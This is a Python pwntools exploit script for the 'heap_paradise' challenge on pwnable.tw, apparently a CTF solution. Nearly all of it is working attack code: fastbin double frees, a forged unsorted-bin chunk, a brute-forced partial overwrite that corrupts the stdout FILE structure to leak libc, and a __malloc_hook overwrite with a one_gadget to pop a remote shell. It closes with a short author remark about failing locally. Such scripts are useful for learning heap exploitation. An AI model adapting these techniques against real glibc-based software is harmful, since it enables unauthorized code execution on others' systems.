from pwn import *

elf = ELF("heap_paradise")


def alloc(size, data):
    p.sendlineafter("You Choice:", "1")
    p.sendlineafter("Size :", str(size))
    p.sendafter("Data :", data)

def free(index):
    p.sendlineafter("You Choice:", "2")
    p.sendlineafter("Index :", str(index))

while True:
    # p = process("./heap_paradise_local", env={"LD_PRELOAD":"libc-2.23.so"}, aslr=True)
    # libc = ELF("libc-2.23.so")
    # offset_libc = 0x3c5600

    p = remote("chall.pwnable.tw", 10308)
    libc = ELF("libc_64.so.6")
    offset_libc = 0x3c4600

    alloc(0x68, "A"*0x40 + p64(0) + p64(0x71) + p64(0)*3)           # chunk 0, create a fake chunk so that we can use it to free unsorted bin
    alloc(0x68, "B"*0x68)                                           # chunk 1
    alloc(0x68, "C"*0x28 + p64(0x41))                               # chunk 2, create a fake chunk to avoid merge to top_chunk

    # double free
    free(0)
    free(1)
    free(0)
    alloc(0x68, "\x50")             # chunk 3, now fd pointer of chunk 0 point to chunk0+0x40
    alloc(0x68, "\n")               # chunk 4
    alloc(0x68, "\n")               # chunk 5
    alloc(0x68, p64(0)*3 + p64(0xa1))   # chunk 6, overwrite size of chunk 1 to 0xa0 => unsorted bin size


    # put chunk 1 to unsorted bin
    free(1)         

    # this is the hardest part of this challenge, we need a chunk in fastbin[5] that point to an address of libc to overwrite stdouts flag
    free(0)
    free(2)
    # now in fastbin[5] we have chunk2 -> chunk0


    # allocate a chunk from unsorted bin that overflow chunk 2 to create a fake chunk in side chunk 2 which has fd pointer point to main_arena+0x88
    alloc(0x78, "C"*0x68 + p64(0x71) + "\xf0")                # chunk 7, write fd pointer of chunk2 to chunk2+0x10

    # after overflow chunk 2, in fastbin[5] we have: chunk2 -> chunk2+0x10 -> main_arena+0x88
    alloc(0x68, p64(0) + p64(0x71) + p16(0xf5dd))               # chunk 8, paritaly overwrite fd pointer of chunk2+0x10 from main_arena+0x88 to _IO_2_1_stdout_-0x43
    
    alloc(0x68, "\n")        # chunk 9

    # bruteforce with 1/16 chances to get a chunk with perfect size 0x78
    try:
        alloc(0x68, "A" * 0x33 + p64(0xfbad1800) + p64(0) * 3 + '\x00') # chunk 10, overwrite flag in stdouts
    except:
        p.close()
        continue
    
    # leak libc
    p.recv(64)
    leak_libc = u64(p.recv(8))
    libc_base = leak_libc - offset_libc
    malloc_hook = libc_base + libc.symbols["__malloc_hook"]
    one_gadget = libc_base + 0xef6c4
    log.success("libc base: %s"%hex(libc_base))
    log.success("malloc hook: %s"%hex(malloc_hook))
    log.success("one gadget: %s"%hex(one_gadget))

    # double free to write malloc_hook with one_gadget
    free(0)
    free(2)
    free(0)

    alloc(0x68, p64(malloc_hook-0x23))             # chunk 11
    alloc(0x68, "\n")               # chunk 12
    alloc(0x68, "\n")               # chunk 13
    alloc(0x68, "\x00"*0x13 + p64(one_gadget))   # chunk 14

    p.sendlineafter("You Choice:", "1")
    p.sendlineafter("Size :", "1")          # chunk 15

    p.interactive()

"""
idk why in my local, list_heap[15] stores an address of libc so i cant allocate chunk 15 to pop shell :((
"""